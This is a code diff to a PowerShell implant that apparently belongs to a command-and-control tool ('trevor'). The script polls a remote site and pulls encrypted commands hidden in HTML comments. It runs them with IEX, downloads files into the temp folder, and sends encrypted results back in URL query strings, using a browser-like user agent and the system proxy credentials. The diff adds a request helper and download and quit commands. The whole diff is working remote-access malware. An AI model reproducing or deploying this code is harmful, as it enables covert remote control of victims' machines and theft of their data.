@@ -82,6 +82,49 @@ function random_interval {
 
 $cookiecontainer = New-Object System.Net.CookieContainer
 
+function invoke-trevorrequest {
+    param(
+        $URL,
+        [switch]$ReadStream,
+        [string]$Destination
+    )
+
+    $r = [System.Net.HTTPWebRequest]::Create($URL)
+    $r.CookieContainer = $cookiecontainer
+    $r.proxy = [System.net.webrequest]::DefaultWebProxy
+    $r.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
+    $r.Method = "GET"
+    $r.KeepAlive = $false
+    $r.UserAgent = "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"
+    $r.Headers.Add("Accept-Encoding", "identity");
+    $resp = $r.GetResponse()
+    if ($ReadStream) {
+        $reqstream = $resp.GetResponseStream()
+        if (!$Destination) {
+            $sr = New-Object System.IO.StreamReader $reqstream
+            $resp = $sr.ReadToEnd()
+        }
+        else {
+            $targetStream = New-Object -TypeName System.IO.FileStream -ArgumentList $Destination, Create
+            $buffer = new-object byte[] 1KB
+            $size = $reqstream.Read($buffer,0,$buffer.length)
+            while ($size -gt 0) {
+                $targetStream.Write($buffer, 0, $size)
+                $size = $reqstream.Read($buffer,0,$buffer.length)
+            }
+
+            $targetStream.Flush()
+            $targetStream.Close()
+            $targetStream.Dispose()
+        }
+        $reqstream.Dispose()
+    }
+
+    if (!$Destination) {
+       return $resp
+    }
+}
+
 function connect-trevor {
     while ($True) {
         $time = random_interval
@@ -92,13 +135,8 @@ function connect-trevor {
             $SEND = Encrypt-String $key $HOSTNAME
             $s = [System.Text.Encoding]::UTF8.GetBytes($SEND)
             $SEND = [System.Convert]::ToBase64String($s)
-            $r = [System.Net.HTTPWebRequest]::Create($SITE_URL+$SITE_PATH_QUERY+"?"+$QUERY_STRING+$SEND)
-            $r.CookieContainer = $cookiecontainer
-            $r.Method = "GET"
-            $r.KeepAlive = $false
-            $r.UserAgent = "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"
-            $r.Headers.Add("Accept-Encoding", "identity");
-            $resp = $r.GetResponse()
+            $URL = $SITE_URL+$SITE_PATH_QUERY+"?"+$QUERY_STRING+$SEND
+            $resp = invoke-trevorrequest -url $URL
             break
         }
         catch [System.Management.Automation.MethodInvocationException] {
@@ -115,16 +153,9 @@ connect-trevor
 while ($True) {
     $time = random_interval
     try {
-        $r = [System.Net.HTTPWebRequest]::Create($SITE_URL + $ROOT_PATH_QUERY)
-        $r.CookieContainer = $cookiecontainer
-        $r.Method = "GET"
-        $r.KeepAlive = $false
-        $r.UserAgent = "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"
-        $r.Headers.Add("Accept-Encoding", "identity");
-        $resp = $r.GetResponse()
-        $reqstream = $resp.GetResponseStream()
-        $sr = New-Object System.IO.StreamReader $reqstream
-        $ENCRYPTEDSTREAM = $sr.ReadToEnd() -split("`n") | Select-String "<!-- $STUB"
+        $URL = $SITE_URL + $ROOT_PATH_QUERY
+        $resp = invoke-trevorrequest -url $URL -readstream
+        $ENCRYPTEDSTREAM = $resp -split("`n") | Select-String "<!-- $STUB"
         $ENCRYPTED = $ENCRYPTEDSTREAM -split("<!-- $STUB")
         $ENCRYPTED = $ENCRYPTED[1] -split(" --></body>")
         $key = Create-AesKey
@@ -134,27 +165,63 @@ while ($True) {
         }
         else{
             if ($DECRYPTED -like $env:computername + "*"){
-                $DECRYPTED = $DECRYPTED -split($env:computername + "::::")
-                try {
-                    $RUN = "$DECRYPTED" | IEX -ErrorAction stop | Out-String
+                $doexit = $false
+                [string]$DECRYPTED = $($DECRYPTED -split $env:computername + "::::")[1]
+                if ([string]$DECRYPTED -like "tc2 *") {
+                    $command = $DECRYPTED -split " ",3
+                    if ($command[1] -eq 'download') {
+                        try {
+                            $URL = $SITE_URL + $command[2]
+                            $File = $(join-path $env:temp $($URL | split-path -Leaf))
+                            invoke-trevorrequest -URL $URL -ReadStream -Destination $File
+                            $RUN = "Download of $URL to $File succeeded"
+                        }
+                        catch {
+                            $RUN = $_ | out-string
+                        }
+                    }
+                    elseif ($command[1] -eq 'quit') {
+                        $doexit = $true
+                        $RUN = "This session is terminated"
+                    }
+                    else {
+                        $RUN = "Unknown command"
+                    }
                 }
-                catch {
-                    $RUN = $_ | out-string
+                else {
+                    try {
+                        $RUN = "$DECRYPTED" | IEX -ErrorAction stop | Out-String
+                    }
+                    catch {
+                        $RUN = $_ | out-string
+                    }
+                }
+
+                if (!$RUN) {
+                    $RUN = "No data has been returned, there is also no error on execution"
                 }
                 $RUN = ($env:computername + "::::" + $RUN)
                 $SEND = Encrypt-String $key $RUN
                 $s = [System.Text.Encoding]::UTF8.GetBytes($SEND)
                 $SEND = [System.Convert]::ToBase64String($s)
-                $r = [System.Net.HTTPWebRequest]::Create($SITE_URL+$SITE_PATH_QUERY+"?"+$QUERY_STRING+$SEND)
-                $r.CookieContainer = $cookiecontainer
-                $r.Method = "GET"
-                $r.KeepAlive = $false
-                $r.UserAgent = "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"
-                $r.Headers.Add("Accept-Encoding", "identity");
-                $resp = $r.GetResponse()
-                sleep $time
+                $GETURL = $QUERY_STRING+$SEND
+                if ($GETURL.length -gt 8192) {
+                    $RUN = ($env:computername + "::::" + "There was to much data to report back")
+                    $SEND = Encrypt-String $key $RUN
+                    $s = [System.Text.Encoding]::UTF8.GetBytes($SEND)
+                    $SEND = [System.Convert]::ToBase64String($s)
+                    $GETURL = $QUERY_STRING+$SEND
+                }
+                $URL = $SITE_URL+$SITE_PATH_QUERY+"?"+$GETURL
+                $resp = invoke-trevorrequest -url $URL
 
+                if ($doexit) {
+                    return;
+                }
+
+                sleep $time
             }
+
         }
     }
     catch [System.Management.Automation.MethodInvocationException] {
